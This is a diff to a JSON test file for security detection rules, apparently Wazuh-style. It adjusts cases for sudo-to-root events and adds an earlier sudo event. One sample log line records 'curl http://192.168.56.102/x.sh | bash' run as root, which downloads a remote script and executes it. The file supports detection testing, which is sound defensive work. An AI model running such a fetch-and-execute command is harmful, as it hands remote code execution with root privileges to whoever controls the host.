@@ -35,16 +35,17 @@
       ]
     },
     {
-      "name": "sudo root shell",
-      "gap": "every sudo to root was level 3",
+      "name": "sudo root shell, even as the user's first sudo",
+      "gap": "every sudo to root was level 3; a user's first sudo is 5403 and skips everything under 5402",
       "steps": [
         {"log": "2026-11-17T01:04:00.000000+00:00 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash", "expect": ["100110"]}
       ]
     },
     {
-      "name": "sudo running a downloaded script",
+      "name": "sudo running a downloaded script, after an earlier sudo",
       "gap": "every sudo to root was level 3",
       "steps": [
+        {"log": "2026-11-17T01:04:05.000000+00:00 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id", "expect": ["5403", "5402"]},
         {"log": "2026-11-17T01:04:10.000000+00:00 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c curl http://192.168.56.102/x.sh | bash", "expect": ["100111"]}
       ]
     },
